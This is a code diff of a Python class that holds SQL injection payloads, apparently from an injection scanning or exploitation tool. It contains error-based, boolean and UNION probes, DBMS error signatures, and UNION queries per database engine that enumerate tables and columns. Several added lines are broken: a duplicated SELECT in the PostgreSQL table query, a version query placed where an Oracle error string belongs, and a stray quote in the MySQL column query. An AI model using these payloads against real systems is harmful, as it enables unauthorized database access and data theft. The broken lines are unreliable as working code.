@@ -1,8 +1,16 @@
 class Query:
     checks = {
         'error': ["'"],
-        'boolean': ["' AND 1=1 -- ", "' AND 1=2 -- "],
+        'boolean': ["1' AND 1=1 -- ", "1' AND 1=2 -- "],
         'union': ["' UNION SELECT NULL -- ", "' UNION SELECT NULL, NULL -- ", "' UNION SELECT NULL, NULL, NULL -- "],
+    }
+
+    errors = {
+        'MySQL': "You have an error in your SQL syntax;",
+        'Microsoft': "Unclosed quotation mark",
+        'Oracle': "' UNION SELECT banner FROM v$version WHERE rownum = 1 -- ",
+        'PostgreSQL': "ERROR: syntax error at",
+        'SQLite': 'near "\'\": syntax error'
     }
 
     versions = {
@@ -14,19 +22,19 @@ class Query:
     }
 
     tables = {
-        'MySQL': "' UNION SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' -- ",
-        'Microsoft': "' UNION SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' -- ",
-        'Oracle': "' UNION SELECT table_name FROM all_tables -- ",
-        'PostgreSQL': "' UNION SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%' ORDER BY relname; -- ",
+        'MySQL': "' UNION SELECT * FROM information_schema.tables -- ",
+        'Microsoft': "' UNION SELECT * FROM information_schema.tables -- ",
+        'Oracle': "' UNION SELECT * FROM all_tables -- ",
+        'PostgreSQL': "' UNION SELECT SELECT * FROM information_schema.tables -- ",
         'SQLite': "' UNION SELECT name FROM sqlite_master WHERE type='table' -- "
     }
 
     columns = {
-        'MySQL': "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'Users' -- ",
-        'Microsoft': "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'Users' -- ",
-        'Oracle': "' UNION SELECT column_name FROM all_cons_columns WHERE table_name = 'USERS' -- ",
-        'PostgreSQL': "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
-        'SQLite': "' UNION SELECT sql FROM sqlite_master WHERE name='users' -- " 
+        'MySQL': "' UNION SELECT column_name, data_type FROM information_schema.columns ' -- ",
+        'Microsoft': "' UNION SELECT column_name, data_type FROM information_schema.columns  -- ",
+        'Oracle': "' UNION SELECT column_name FROM all_cons_columns  -- ",
+        'PostgreSQL': "' UNION SELECT column_name FROM information_schema.columns  -- ",
+        'SQLite': "' UNION SELECT sql FROM sqlite_master  -- " 
     }
 
     dump = {
